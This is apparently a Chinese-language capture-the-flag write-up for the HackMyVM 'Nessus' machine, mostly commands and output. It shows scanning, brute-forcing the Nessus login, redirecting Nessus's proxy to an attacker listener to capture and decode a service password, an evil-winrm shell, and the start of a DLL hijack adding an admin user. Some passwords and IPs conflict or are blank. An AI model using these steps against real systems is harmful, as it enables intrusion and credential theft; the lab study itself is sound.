{"pageProps":{"postData":{"id":"HackMyVMNessus","contentHtml":"<h1>Nessus.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Nessus\">https://hackmyvm.eu/machines/machine.php?vm=Nessus</a></p>\n</blockquote>\n<p>Note: <strong>Just exploit a well known application without a CVE. Hope you enjoy it.</strong></p>\n<h2>信息收集 &#x26; 扫描</h2>\n<pre><code class=\"hljs language-c\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>                                \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-05 01:37 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is up (<span class=\"hljs-number\">0.00068</span>s latency).\nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">23</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is up (<span class=\"hljs-number\">0.00036</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">5</span>A:<span class=\"hljs-number\">88</span>:BB (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> \nHost is up (<span class=\"hljs-number\">0.00080</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A3:<span class=\"hljs-number\">75</span>:F0 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>\n</code></pre>\n<pre><code class=\"hljs language-c\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p-                            \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-05 01:37 EST        </span>\nWarning:  giving up on port because retransmission cap hit (<span class=\"hljs-number\">10</span>).\nNmap scan report <span class=\"hljs-keyword\">for</span>                                                                       \nHost is up (<span class=\"hljs-number\">0.00024</span>s latency).                                                                           \nNot shown: <span class=\"hljs-number\">65001</span> closed tcp ports (conn-refused), <span class=\"hljs-number\">522</span> filtered tcp ports (no-response)\nPORT      STATE SERVICE                                                                                  \n<span class=\"hljs-number\">135</span>/tcp   open  msrpc                                                                                    \n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn                                                                              \n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds                                                                             \n<span class=\"hljs-number\">5985</span>/tcp  open  wsman                                                                                    \n<span class=\"hljs-number\">8834</span>/tcp  open  nessus-xmlrpc                                                                            \n<span class=\"hljs-number\">47001</span>/tcp open  winrm                                                                                    \n<span class=\"hljs-number\">49664</span>/tcp open  unknown                                                                                  \n<span class=\"hljs-number\">49665</span>/tcp open  unknown                                                                                  \n<span class=\"hljs-number\">49666</span>/tcp open  unknown\n<span class=\"hljs-number\">49667</span>/tcp open  unknown                                                                                  \n<span class=\"hljs-number\">49668</span>/tcp open  unknown                                                                                  \n<span class=\"hljs-number\">49671</span>/tcp open  unknown                                                                                  \nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A3:<span class=\"hljs-number\">75</span>:F0 (Oracle VirtualBox virtual NIC\n</code></pre>\n<pre><code class=\"hljs language-c\">nmap -sT -sV -O -p <span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">5958</span>,<span class=\"hljs-number\">8834</span>,<span class=\"hljs-number\">47001</span> Starting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-05 01:39 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span>                                                                       \nHost is up (<span class=\"hljs-number\">0.00052</span>s latency).\n\nPORT      STATE  SERVICE            VERSION\n<span class=\"hljs-number\">135</span>/tcp   open   msrpc              Microsoft Windows RPC\n<span class=\"hljs-number\">139</span>/tcp   open   netbios-ssn        Microsoft Windows netbios-ssn                                        \n<span class=\"hljs-number\">445</span>/tcp   open   microsoft-ds?                                                                           \n<span class=\"hljs-number\">5958</span>/tcp  closed unknown                                                                                 \n<span class=\"hljs-number\">8834</span>/tcp  open   ssl/nessus-xmlrpc?                 \n<span class=\"hljs-number\">47001</span>/tcp open   http               Microsoft HTTPAPI httpd <span class=\"hljs-number\">2.0</span> (SSDP/UPnP)            \nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows                  \n</code></pre>\n<pre><code class=\"hljs language-c\">nmap -script=vuln -p <span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">5958</span>,<span class=\"hljs-number\">8834</span>,<span class=\"hljs-number\">47001</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-05 01:46 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> \nHost is up (<span class=\"hljs-number\">0.00064</span>s latency).\n\nPORT      STATE  SERVICE\n<span class=\"hljs-number\">135</span>/tcp   open   msrpc\n<span class=\"hljs-number\">139</span>/tcp   open   netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp   open   microsoft-ds\n<span class=\"hljs-number\">5958</span>/tcp  closed unknown\n<span class=\"hljs-number\">8834</span>/tcp  open   nessus-xmlrpc\n<span class=\"hljs-number\">47001</span>/tcp open   winrm\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A3:<span class=\"hljs-number\">75</span>:F0 (Oracle VirtualBox virtual NIC)\n\nHost script results:\n|_samba-vuln-cve<span class=\"hljs-number\">-2012</span><span class=\"hljs-number\">-1182</span>: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10<span class=\"hljs-number\">-061</span>: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10<span class=\"hljs-number\">-054</span>: <span class=\"hljs-literal\">false</span>\n</code></pre>\n<h2>WEB渗透</h2>\n<p>注意到存在一个nessus的监听端口，和靶机是同名的，同时也知道nessus是知名的漏洞扫描软件</p>\n<p>访问<code>8834</code>端口</p>\n<p><img src=\"/post-images/HackMyVMNessus/image14.png\" alt=\"image.png\"></p>\n<p>是Nessus的登录页面，尝试使用默认账户密码登录，但是Nessus的默认账号密码是自己设置的</p>\n<p>然后注意到存在<code>445</code>端口，瞅一眼存在什么东西</p>\n<pre><code class=\"hljs language-c\">smbclient -L \nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        Documents       Disk      \n        IPC$            IPC       Remote IPC\nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection to  <span class=\"hljs-title function_\">failed</span> <span class=\"hljs-params\">(Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span>\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<p>都试着访问，最后发现<code>Documents</code>文件夹是可以访问的</p>\n<pre><code class=\"hljs language-c\">smbclient <span class=\"hljs-comment\">///ADMIN$</span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:\ntree connect failed: NT_STATUS_ACCESS_DENIED\n                                                                                                                                                                                                                  \n┌──(root㉿kali)-[~]\n└─<span class=\"hljs-meta\"># smbclient <span class=\"hljs-comment\">///C$    </span></span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:\ntree connect failed: NT_STATUS_ACCESS_DENIED\n                                                                                                                                                                                                               \n┌──(root㉿kali)-[~]\n└─<span class=\"hljs-meta\"># smbclient <span class=\"hljs-comment\">///Documents</span></span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:\nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.\nsmb: \\> ls\n  .                                  DR        <span class=\"hljs-number\">0</span>  Fri Oct <span class=\"hljs-number\">18</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">53</span> <span class=\"hljs-number\">2024</span>\n  ..                                  D        <span class=\"hljs-number\">0</span>  Sat Oct <span class=\"hljs-number\">19</span> <span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">23</span> <span class=\"hljs-number\">2024</span>\n  desktop.ini                       AHS      <span class=\"hljs-number\">402</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">33</span> <span class=\"hljs-number\">2024</span>\n  My Basic Network Scan_hwhm7q.pdf      A   <span class=\"hljs-number\">122006</span>  Fri Oct <span class=\"hljs-number\">18</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">59</span> <span class=\"hljs-number\">2024</span>\n  My Music                        DHSrn        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">27</span> <span class=\"hljs-number\">2024</span>\n  My Pictures                     DHSrn        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">27</span> <span class=\"hljs-number\">2024</span>\n  My Videos                       DHSrn        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">27</span> <span class=\"hljs-number\">2024</span>\n  Web Application Tests_f6jg9t.pdf      A   <span class=\"hljs-number\">136025</span>  Fri Oct <span class=\"hljs-number\">18</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">14</span> <span class=\"hljs-number\">2024</span>\n\n                <span class=\"hljs-number\">12942591</span> blocks of size <span class=\"hljs-number\">4096.</span> <span class=\"hljs-number\">10996103</span> blocks available\nsmb: \\> \n</code></pre>\n<p>将文件全都拉取出来</p>\n<pre><code class=\"hljs language-c\">smb: \\> mget *\nGet file desktop.ini? y\ngetting file \\desktop.ini of size <span class=\"hljs-number\">402</span> as desktop.ini (<span class=\"hljs-number\">8.5</span> KiloBytes/sec) (average <span class=\"hljs-number\">8.5</span> KiloBytes/sec)\nGet file My Basic Network Scan_hwhm7q.pdf? y\ngetting file \\My Basic Network Scan_hwhm7q.pdf of size <span class=\"hljs-number\">122006</span> as My Basic Network Scan_hwhm7q.pdf (<span class=\"hljs-number\">1588.6</span> KiloBytes/sec) (average <span class=\"hljs-number\">987.9</span> KiloBytes/sec)\nGet file Web Application Tests_f6jg9t.pdf? y\ngetting file \\Web Application Tests_f6jg9t.pdf of size <span class=\"hljs-number\">136025</span> as Web Application Tests_f6jg9t.pdf (<span class=\"hljs-number\">2711.0</span> KiloBytes/sec) (average <span class=\"hljs-number\">1484.6</span> KiloBytes/sec)\n</code></pre>\n<p>拉取出来三个文件</p>\n<pre><code class=\"hljs language-c\">desktop.ini  <span class=\"hljs-string\">'My Basic Network Scan_hwhm7q.pdf'</span>  <span class=\"hljs-string\">'Web Application Tests_f6jg9t.pdf'</span>\n</code></pre>\n<pre><code class=\"hljs language-c\">cat desktop.ini                                                          \n\n[.ShellClassInfo]\nLocalizedResourceName=@%SystemRoot%\\system32\\shell32.dll,<span class=\"hljs-number\">-21770</span>\nIconResource=%SystemRoot%\\system32\\imageres.dll,<span class=\"hljs-number\">-112</span>\nIconFile=%SystemRoot%\\system32\\shell32.dll\nIconIndex=<span class=\"hljs-number\">-235</span>\n</code></pre>\n<p>其余两个是PDF文件</p>\n<p><code>My Basic Network Scan_hwhm7q.pdf</code> 像是扫描记录，不过<code>Note</code>给了说不用进行<code>cve</code>尝试（其实也灭扫描出来什么）</p>\n<p><code>Web Application Tests_f6jg9t.pdf</code> 扫描出来很多个严重的漏洞，但是没看到这个被扫描的程序在哪里</p>\n<p>使用<code>exiftool</code>来读取文件元信息，在回显的信息中看到<code>Author</code>中发现<code>Jose</code> 用户，因为是从nessus导出的文件中读取出来的，所以可能是<code>nessus</code>的用户</p>\n<pre><code class=\"hljs language-c\">exiftool *\n<span class=\"hljs-comment\">//</span>\nAuthor                          : Jose \n</code></pre>\n<p>那么就可以执行爆破了</p>\n<p>网上搜索<code>nessus</code>用户名大多是 <code>admin</code> ,<code>root</code> 我们在基础上再加上作者名<code>jose</code></p>\n<p>抓取登录<code>nusses</code>的包，然后放到<code>intruder</code>进行爆破</p>\n<p><img src=\"/post-images/HackMyVMNessus/image15.png\" alt=\"image.png\"></p>\n<p><code>username</code>位置我们仅使用<code>admin root jose</code> ，<code>password</code>我们使用<code>rockyou</code>字典</p>\n<p>很快我们就获取到一个<code>200</code>状态码的包了</p>\n<p><img src=\"/post-images/HackMyVMNessus/image16.png\" alt=\"image.png\"></p>\n<p>用户名 <code>jose</code> 密码 <code>tequiero</code> ，尝试登录<code>nessus</code> ，登录成功</p>\n<p><img src=\"/post-images/HackMyVMNessus/image17.png\" alt=\"image.png\"></p>\n<p>进去后在<code>Proxy Server</code>中可以知道系统中存在<code>nesus</code>用户，但是密码看不见</p>\n<p><img src=\"/post-images/HackMyVMNessus/image18.png\" alt=\"image.png\"></p>\n<p>发现其中存在<code>Auth Method</code>验证方法，我们将其修改为<code>Basic</code> ，然后将代理服务器设置为<code>Kali</code>的<code>ip</code></p>\n<p>随后<code>kali</code>监听</p>\n<pre><code class=\"hljs language-c\">nc -lvp <span class=\"hljs-number\">8080</span>                                                   \nlistening on [any] <span class=\"hljs-number\">8080</span> ...\n</code></pre>\n<p>点击<code>nessus</code>上的<code>Test Proxy Server</code> ，随后在<code>Kali</code>中可以接收到信息</p>\n<pre><code class=\"hljs language-c\">nc -lvp <span class=\"hljs-number\">8080</span>                          \nlistening on [any] <span class=\"hljs-number\">8080</span> ...\n: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>] from (UNKNOWN) [] <span class=\"hljs-number\">49733</span>\nCONNECT plugins.nessus.org:<span class=\"hljs-number\">443</span> HTTP/<span class=\"hljs-number\">1.1</span>\nProxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==\nHost: plugins.nessus.org\nConnection: keep-Alive\nUser-Agent: Nessus/<span class=\"hljs-number\">10.7</span>.<span class=\"hljs-number\">3</span>\nContent-Length: <span class=\"hljs-number\">0</span>\nProxy-Connection: Keep-Alive\n</code></pre>\n<p>其中的 <code>Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==</code> 非常可疑，看着像是<code>Base64</code></p>\n<pre><code class=\"hljs language-c\">echo <span class=\"hljs-string\">'bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ=='</span> | base64 -d\nnesus:Z#JuXH$ph-;v@,X&#x26;mV)\n</code></pre>\n<p>这密码不知道准不准确…</p>\n<p>使用<code>netexec</code>来测试<code>smb</code> ，密码正确提示已过期？</p>\n<pre><code class=\"hljs language-c\">netexec smb  -u nesus -p <span class=\"hljs-string\">'Z#JuXH$ph-;v@,X&#x26;mV)'</span>\nSMB           <span class=\"hljs-number\">445</span>    NESSUS           [*] Windows Server <span class=\"hljs-number\">2022</span> Build <span class=\"hljs-number\">20348</span> x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)\nSMB           <span class=\"hljs-number\">445</span>    NESSUS           [-] Nessus\\nesus:Z#JuXH$ph-;v@,X&#x26;mV) STATUS_PASSWORD_EXPIRED \n</code></pre>\n<p>尝试用<code>wmiexec</code>执行命令，还是提示密码过期</p>\n<pre><code class=\"hljs language-c\">wmiexec.py nesus:<span class=\"hljs-string\">'Z#JuXH$ph-;v@,X&#x26;mV)'</span>@\nImpacket v0.<span class=\"hljs-number\">12.0</span> - Copyright Fortra, LLC and its affiliated companies \n\n[-] SMB SessionError: code: <span class=\"hljs-number\">0xc0000071</span> - STATUS_PASSWORD_EXPIRED - The user account password has expired.\n</code></pre>\n<blockquote>\n<p>PS:我之后手动重置了一下密码才能继续，修改密码为<code>123456</code></p>\n</blockquote>\n<p>可以发现不存在 <code>STATUS_PASSWORD_EXPIRED</code> 了</p>\n<pre><code class=\"hljs language-c\">netexec smb <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span> -u nesus -p Aa118811             \nSMB         <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>    <span class=\"hljs-number\">445</span>    NESSUS           [*] Windows Server <span class=\"hljs-number\">2022</span> Build <span class=\"hljs-number\">20348</span> x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)\nSMB         <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>    <span class=\"hljs-number\">445</span>    NESSUS           [+] Nessus\\nesus:<span class=\"hljs-number\">123456</span>\n</code></pre>\n<p>使用<code>evil-winrm</code>获得<code>shell</code></p>\n<pre><code class=\"hljs language-c\">evil-winrm -i <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span> -u nesus -p Aa118811             \n                                        \nEvil-WinRM shell v3.<span class=\"hljs-number\">7</span>\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https:<span class=\"hljs-comment\">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span>\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\nesus\\Documents> \n</code></pre>\n<h2>UserFlag</h2>\n<p>之后可以读取<code>userflag</code>了</p>\n<pre><code class=\"hljs language-c\">*Evil-WinRM* PS C:\\Users\\nesus\\Desktop> type user.txt\n<span class=\"hljs-number\">72113f</span>41d43e88eb5d67f732668bc3d1\n</code></pre>\n<p>获取到<code>user Flag</code> 接下来就是要获取到<code>root Flag</code>了</p>\n<h2>DLL 劫持</h2>\n<p>上传<code>winpeas</code>运行一下，显示可能存在<code>DLL</code>劫持</p>\n<pre><code class=\"hljs language-c\">[*] DLL HIJACKING in PATHenv variable\n   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations \n   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate \n   [?] https:<span class=\"hljs-comment\">//book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking</span>\n</code></pre>\n<p>翻一下目录（想起来存在nessus）</p>\n<pre><code class=\"hljs language-c\">*Evil-WinRM* PS C:\\Program Files\\tenable\\Nessus> dir\n\n    Directory: C:\\Program Files\\tenable\\Nessus\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        <span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">18</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">35</span> AM              <span class=\"hljs-number\">1</span> .winperms\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span> PM        <span class=\"hljs-number\">2471544</span> fips.dll\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span> PM        <span class=\"hljs-number\">5217912</span> icudt73.dll\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span> PM        <span class=\"hljs-number\">1575032</span> icuuc73.dll\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span> PM        <span class=\"hljs-number\">4988536</span> legacy.dll\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">06</span> PM         <span class=\"hljs-number\">375266</span> License.rtf\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">37</span> PM       <span class=\"hljs-number\">11204728</span> nasl.exe\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">31</span> PM         <span class=\"hljs-number\">264824</span> ndbg.exe\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">06</span> PM             <span class=\"hljs-number\">46</span> Nessus Web Client.url\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">33</span> PM          <span class=\"hljs-number\">38520</span> nessus-service.exe\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">37</span> PM       <span class=\"hljs-number\">11143800</span> nessuscli.exe\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">38</span> PM       <span class=\"hljs-number\">11925624</span> nessusd.exe\n</code></pre>\n<p>发现<code>Nessus</code>的目录下的文件我们拥有完全权限</p>\n<p>可以注意到许多<code>DLL</code>文件，并且我们也存在所有权限，所以我们可以尝试<code>DLL</code>劫持</p>\n<p>首先看<code>nessus</code>有哪些可以劫持的DLL，首先我们查看<code>nessus-service.exe</code> 引用了哪些<code>DLL</code> ，这里选择<code>VCRUNTIME140.dll</code>进行尝试</p>\n<p><img src=\"/post-images/HackMyVMNessus/image19.png\" alt=\"image.png\"></p>\n<p>我们首先创建一个假的<code>VCRUNTIME140.dll</code>进行文件进行测试，让<code>Nessus</code>不能启动成功</p>\n<pre><code class=\"hljs language-c\">*Evil-WinRM* PS C:\\program files\\tenable\\Nessus> echo <span class=\"hljs-string\">\"TEST\"</span> > VCRUNTIME140.dll\n*Evil-WinRM* PS C:\\program files\\tenable\\Nessus> dir\n    Directory: C:\\program files\\tenable\\Nessus\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        <span class=\"hljs-number\">10</span>/<span class=\"hljs-number\">18</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">35</span> AM              <span class=\"hljs-number\">1</span> .winperms\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span> PM        <span class=\"hljs-number\">2471544</span> fips.dll\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span> PM        <span class=\"hljs-number\">5217912</span> icudt73.dll\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span> PM        <span class=\"hljs-number\">1575032</span> icuuc73.dll\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">30</span> PM        <span class=\"hljs-number\">4988536</span> legacy.dll\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">06</span> PM         <span class=\"hljs-number\">375266</span> License.rtf\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">37</span> PM       <span class=\"hljs-number\">11204728</span> nasl.exe\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">31</span> PM         <span class=\"hljs-number\">264824</span> ndbg.exe\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">06</span> PM             <span class=\"hljs-number\">46</span> Nessus Web Client.url\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">33</span> PM          <span class=\"hljs-number\">38520</span> nessus-service.exe\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">37</span> PM       <span class=\"hljs-number\">11143800</span> nessuscli.exe\n-a----          <span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">9</span>/<span class=\"hljs-number\">2024</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">38</span> PM       <span class=\"hljs-number\">11925624</span> nessusd.exe\n-a----          <span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">8</span>/<span class=\"hljs-number\">2025</span>   <span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">02</span> PM             <span class=\"hljs-number\">14</span> VCRUNTIME140.dll\n</code></pre>\n<p>重启测试一下<code>nessus</code>有没有启动，直接重新扫描一下端口，可以看到<code>8834</code>端口没有启动，所以劫持成功了</p>\n<pre><code class=\"hljs language-c\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>                    \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-08 02:05 EST</span>\nWarning: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span> giving up on port because retransmission cap hit (<span class=\"hljs-number\">10</span>).\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span>\nHost is up (<span class=\"hljs-number\">0.00052</span>s latency).\nNot shown: <span class=\"hljs-number\">65376</span> closed tcp ports (conn-refused), <span class=\"hljs-number\">148</span> filtered tcp ports (no-response)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">135</span>/tcp   open  msrpc\n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds\n<span class=\"hljs-number\">5985</span>/tcp  open  wsman\n<span class=\"hljs-number\">47001</span>/tcp open  winrm\n<span class=\"hljs-number\">49664</span>/tcp open  unknown\n<span class=\"hljs-number\">49665</span>/tcp open  unknown\n<span class=\"hljs-number\">49666</span>/tcp open  unknown\n<span class=\"hljs-number\">49667</span>/tcp open  unknown\n<span class=\"hljs-number\">49668</span>/tcp open  unknown\n<span class=\"hljs-number\">49669</span>/tcp open  unknown\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">7</span>A:<span class=\"hljs-number\">85</span>:C1 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<p>用<code>C</code>语言写一个创建<code>windows</code>管理员用户的代码（来自作者的<code>WP</code>）也可以使用GPT生成</p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&#x3C;stdlib.h></span></span>\n\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&#x3C;windows.h></span></span>\n <span class=\"hljs-comment\">// COMPILE</span>\n<span class=\"hljs-comment\">// x86_64-w64-mingw32-gcc adduser.c --shared -o adduser.dll</span>\nBOOL APIENTRY <span class=\"hljs-title function_\">DllMain</span><span class=\"hljs-params\">(\n  HANDLE hModule, <span class=\"hljs-comment\">// Handle to DLL module</span>\n  DWORD ul_reason_for_call, <span class=\"hljs-comment\">// Reason for calling function</span>\n  LPVOID lpReserved)</span> <span class=\"hljs-comment\">// Reserved</span>\n{\n  <span class=\"hljs-keyword\">switch</span> (ul_reason_for_call) {\n\t<span class=\"hljs-type\">int</span> i;\n  <span class=\"hljs-keyword\">case</span> DLL_PROCESS_ATTACH: <span class=\"hljs-comment\">// A process is loading the DLL.</span>\n    i = 